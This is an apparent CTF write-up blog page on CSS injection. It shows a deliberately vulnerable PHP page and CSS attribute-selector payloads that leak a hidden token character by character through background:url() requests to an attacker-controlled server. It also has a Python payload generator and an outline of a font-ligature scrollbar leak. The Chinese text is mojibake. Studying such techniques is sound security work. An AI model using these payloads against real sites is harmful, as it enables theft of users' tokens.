<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="cssæ³¨å…¥å­¦ä¹ "/>




  <meta name="keywords" content="ctf," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2019/12/02/cssæ³¨å…¥å­¦ä¹ /"/>


<meta property="og:type" content="article">
<meta property="og:title" content="cssæ³¨å…¥å­¦ä¹ ">
<meta property="og:url" content="https://glotozz.github.io/2019/12/02/css%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2019/12/02/sY67MpeoVzg9ZdS.png">
<meta property="og:image" content="https://i.loli.net/2019/12/02/DCOs2xdg1JkTcUY.png">
<meta property="og:image" content="https://i.loli.net/2019/12/02/zU13vH79y2tfBFR.png">
<meta property="og:image" content="https://i.loli.net/2019/12/02/x1yT3oj2CFUr6wK.png">
<meta property="og:image" content="https://i.loli.net/2019/12/02/v8kXTaqdIWFLpyN.png">
<meta property="article:published_time" content="2019-12-02T01:19:49.000Z">
<meta property="article:modified_time" content="2020-03-29T15:06:13.113Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2019/12/02/sY67MpeoVzg9ZdS.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> cssæ³¨å…¥å­¦ä¹  - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          cssæ³¨å…¥å­¦ä¹ 
        
      </h1>

      <time class="post-time">
          Dec 02 2019
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>ç®€é™‹çš„ç›®å½•</strong></p>
<!-- toc -->

<ul>
<li><a href="#ä¸€-å‡è®¾ä¸€ä¸ªphpé¡µé¢">ä¸€ã€å‡è®¾ä¸€ä¸ªphpé¡µé¢</a></li>
<li><a href="#äºŒ-çªƒå–inputæ ‡ç­¾ä¸­çš„token">äºŒã€çªƒå–inputæ ‡ç­¾ä¸­çš„token</a></li>
<li><a href="#ä¸‰-çªƒå–scriptæ ‡ç­¾ä¸­çš„token">ä¸‰ã€çªƒå–&lt;script&gt;æ ‡ç­¾ä¸­çš„token</a></li>
<li><a href="#å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</a></li>
</ul>
<!-- tocstop -->

<hr>
<blockquote>
<p><strong>cssæœ¬èº«æ˜¯ä¸€ç§å®¹é”™ç‡å¾ˆå¼ºçš„è¯­è¨€ï¼Œcssæ–‡ä»¶å³ä½¿é‡åˆ°é”™è¯¯ï¼Œä¹Ÿä¼šä¸€ç›´è¯»å–ï¼Œç›´åˆ°æœ‰ç¬¦åˆç»“æ„çš„è¯­å¥</strong>ã€‚<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨cssè§£æçš„å®¹é”™æ€§æ„é€  </p>
<p><code>%0a){}body{color:red}/*</code> æ¥æ‰§è¡Œä»»æ„cssã€‚ </p>
</blockquote>
<h4><span id="ä¸€-å‡è®¾ä¸€ä¸ªphpé¡µé¢">ä¸€ã€å‡è®¾ä¸€ä¸ªphpé¡µé¢</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$token1 &#x3D; md5($_SERVER[&#39;HTTP_USER_AGENT&#39;]);</span><br><span class="line">$token2 &#x3D; md5($token1);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;&lt;meta charset&#x3D;utf-8&gt;</span><br><span class="line">&lt;input type&#x3D;hidden value&#x3D;&lt;?&#x3D;$token1 ?&gt;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var TOKEN &#x3D; &quot;&lt;?&#x3D;$token2 ?&gt;&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    &lt;?&#x3D;preg_replace(&#39;#&lt;&#x2F;style#i&#39;, &#39;#&#39;, $_GET[&#39;css&#39;]) ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<h4><span id="äºŒ-çªƒå–inputæ ‡ç­¾ä¸­çš„token">äºŒã€çªƒå–inputæ ‡ç­¾ä¸­çš„token</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*é€‰æ‹©valueå€¼ä¸ºabcçš„inputæ ‡ç­¾*&#x2F;</span><br><span class="line">input[value&#x3D;&quot;abc&quot;] &#123; &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*é€‰æ‹©valueå€¼ä»¥aå¼€å¤´çš„inputæ ‡ç­¾ *&#x2F;</span><br><span class="line">input[value^&#x3D;&quot;a&quot;] &#123; &#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸Šé¢çš„æ¥çˆ†ç ´ç¬¬ä¸€ä¸ªå­—ç¬¦</p>
<p>æ¯”å¦‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input[value^&#x3D;&quot;0&quot;] &#123;</span><br><span class="line">    background: url(http:&#x2F;&#x2F;serwer-napastnika&#x2F;0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/12/02/sY67MpeoVzg9ZdS.png" alt="Snipaste_2019-12-02_10-09-53.png"></p>
<p><strong>æœ‰ä¸ªå‘ï¼Œæœ€æ–°ç‰ˆfirefoxå¦‚æœ<code>type=hiddden</code>ä¼šæ— æ³•åŠ è½½ï¼Œä¸Šé¢çš„å›¾æ˜¯åˆ å»<code>type=hidden</code>çš„æ—¶å€™</strong></p>
<p><img src="https://i.loli.net/2019/12/02/DCOs2xdg1JkTcUY.png" alt="Snipaste_2019-12-02_10-13-33.png"></p>
<p><strong>chromeå¯ä»¥</strong></p>
<p>ä¸€å¼€å§‹æƒ³ç€æ„é€ payloadç„¶åç”¨è„šæœ¬å‘åŒ…ï¼Œå‘ç°è„šæœ¬å‘çš„ä¼šæ”¶ä¸åˆ°ï¼ŒåŸå› å¯èƒ½æ˜¯å› ä¸ºè¿™æ˜¯æµè§ˆå™¨å»è¯·æ±‚çš„ã€‚ã€‚ã€‚åŒæ ·ç›´æ¥æŠŠpayloadæ”¾firefoxä¹Ÿä¸è¡Œï¼Œé‚£ä¹ˆå°±ç”Ÿæˆpayloadæ”¾å…¥chormeå³å¯ï¼Œå†æ ¹æ®vpsçš„æ—¥å¿—ç”Ÿæˆä¸‹ä¸€ä¸ªpayload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">res &#x3D; &quot;&quot;</span><br><span class="line">for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&#39;:</span><br><span class="line">    a &#x3D; &#39;input[value^&#x3D;&quot;28&#39;+str(i)+&#39;&quot;] &#123;background:url(\&#39;http:&#x2F;&#x2F;59.110.164.44&#x2F;28&#39;+str(i)+&#39;\&#39;);&#125;&#39;</span><br><span class="line">    print a</span><br><span class="line">    res +&#x3D; a+&quot;\n&quot;</span><br><span class="line">print res</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç¯å¢ƒå…³äº†ï¼Œå¼€ä¸€ä¸ªdocker</p>
<blockquote>
<p>dockeråœ°å€ï¼š<a href="https://github.com/D0g3-Lab/i-SOON_CTF_2019/tree/master/Web/cssgame" target="_blank" rel="noopener">https://github.com/D0g3-Lab/i-SOON_CTF_2019/tree/master/Web/cssgame</a> </p>
</blockquote>
<p><img src="https://i.loli.net/2019/12/02/zU13vH79y2tfBFR.png" alt="Snipaste_2019-12-02_11-51-45.png"></p>
<p>è¿™é‡Œæ˜¯å¤–é“¾cssï¼Œé‚£ä¹ˆæŠŠcssæ–‡ä»¶æ”¾åˆ°vpsä¸Šï¼Œæ¯æ¬¡ä¿®æ”¹å³å¯</p>
<p><img src="https://i.loli.net/2019/12/02/x1yT3oj2CFUr6wK.png" alt="Snipaste_2019-12-02_11-53-00.png"></p>
<p><img src="https://i.loli.net/2019/12/02/v8kXTaqdIWFLpyN.png" alt="Snipaste_2019-12-02_11-53-22.png"></p>
<h4><span id="ä¸‰-çªƒå–ltscriptgtæ ‡ç­¾ä¸­çš„token">ä¸‰ã€çªƒå–&lt;script&gt;æ ‡ç­¾ä¸­çš„token</span></h4><blockquote>
<ol>
<li>æ„é€ ä¸€ä¸ªå­—ä½“ï¼ŒæŠŠæ‰€æœ‰å­—ç¬¦çš„å®½åº¦éƒ½è®¾ç½®ä¸º0ã€‚</li>
<li>æŠŠã€Œxctfã€çš„å®½åº¦è®¾ç½®ä¸º10000ã€‚</li>
<li>å½“é¡µé¢é‡Œå‡ºç°ã€Œxctfã€çš„æ—¶å€™ï¼Œå°±ä¼šå‡ºç°æ»šåŠ¨æ¡ã€‚</li>
<li>åœ¨æ»šåŠ¨æ¡çš„æ ·å¼é‡Œï¼Œé€šè¿‡<code>background: url()</code>å‘é€è¯·æ±‚ã€‚</li>
<li>é€ä½çˆ†ç ´ã€‚</li>
</ol>
</blockquote>
<blockquote>
<p>æˆ‘ä»¬å°†ä½¿ç”¨è¿å­—å’Œæ ·å¼æ»šåŠ¨æ¡å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„å­—ä½“æ¥å®Œæˆæ”»å‡»ã€‚<br>ä»€ä¹ˆæ˜¯è¿å­—ï¼š<a href="http://www.mzh.ren/ligature-intro.html" target="_blank" rel="noopener">http://www.mzh.ren/ligature-intro.html</a></p>
<p>å€ŸåŠ©<code>fontforge</code>ç­‰å…¶ä»–è½¯ä»¶ <em>ï¼Œ</em>æˆ‘ä»¬å¯ä»¥åˆ›å»ºè‡ªå·±çš„å­—ä½“åŒ…æ‹¬è‡ªå·±çš„è¿å­—ã€‚<br><code>Fontforge</code>æ˜¯ä¸€ä¸ªç›¸å½“å¼ºå¤§çš„å­—ä½“åˆ›å»ºå·¥å…·ã€‚æˆ‘ä»¬å°†ä½¿ç”¨å®ƒå°†å­—ä½“ä»SVGæ ¼å¼è½¬æ¢ä¸ºWOFFã€‚</p>
</blockquote>
<p><strong>æ€è·¯è¿˜æ˜¯å®¹æ˜“ç†è§£çš„ï¼Œå¤ç°æœ‰ç‚¹éº»çƒ¦ï¼Œå…·ä½“å‚è€ƒé“¾æ¥ğŸ¤¦â€â™‚ï¸</strong></p>
<h4><span id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</span></h4><p> <a href="https://www.smi1e.top/é€šè¿‡cssæ³¨å…¥çªƒå–htmlä¸­çš„æ•°æ®/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a> </p>
<p> <a href="https://xz.aliyun.com/t/6655#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6655#toc-5</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>
              <a href="/" title="æ¬¢è¿è®¿é—® glotozz çš„ä¸ªäººåšå®¢">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>
               æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ CC BY-NC-SA 4.0 è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/02/20/start/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">New Start</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2019/12/01/tp6-0-0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        <span class="next-text nav-default">tp6.0.0ååºåˆ—åŒ–æ¼æ´åˆ†æ</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- ä»£ç å—å¤åˆ¶åŠŸèƒ½ -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
